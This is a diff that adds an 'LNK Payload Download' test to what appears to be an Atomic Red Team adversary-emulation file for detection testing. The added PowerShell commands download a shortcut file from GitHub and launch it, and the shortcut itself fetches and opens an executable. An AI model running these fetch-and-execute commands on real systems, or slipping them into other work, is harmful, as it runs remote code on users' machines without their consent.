@@ -388,3 +388,24 @@ atomic_tests:
       Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
     cleanup_command: |
       Remove-Item "C:\Users\$env:username\Desktop\#{file_name}" -ErrorAction Ignore
+      
+- name: LNK Payload Download
+  description: 
+    This lnk files invokes powershell to download putty from the internet and opens the file.
+    https://twitter.com/ankit_anubhav/status/1518932941090410496 
+  supported_platforms:
+    - windows
+  executor:
+    command: |
+      Invoke-WebRequest -OutFile C:\Users\$env:username\AppData\Local\Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test10.lnk"
+      $file1 = "C:\Users\" + $env:username + "\AppData\Local\Temp\test10.lnk"
+      Start-Process $file1
+      Start-Sleep -s 10
+      taskkill /IM a.exe /F
+    cleanup_command: |-
+      $file1 = "C:\Users\" + $env:username + "\AppData\Local\Temp\test10.lnk"
+      $file2 = "C:\Users\" + $env:username + "\AppData\Local\Temp\a.exe"
+      Remove-Item $file1 -ErrorAction Ignore
+      Remove-Item $file2 -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
